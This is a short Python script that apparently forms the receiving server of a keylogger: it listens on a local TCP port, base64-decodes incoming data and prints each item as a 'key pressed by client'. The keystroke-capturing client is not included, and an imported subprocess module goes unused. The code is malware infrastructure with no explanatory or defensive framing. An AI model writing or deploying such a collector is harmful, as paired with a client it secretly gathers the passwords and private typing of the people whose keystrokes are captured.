import socket
import base64
import subprocess

host = '127.0.0.1'
port = 12345

def decode_data(data):
    return base64.b64decode(data).decode()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host, port))
        server_socket.listen()
        print("Server is listening...")

        conn, addr = server_socket.accept()
        with conn:
            print('Connected by', addr)
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                decrypted_data = decode_data(data.decode())
                print("Key pressed by client:", decrypted_data)

if __name__ == "__main__":
    main()

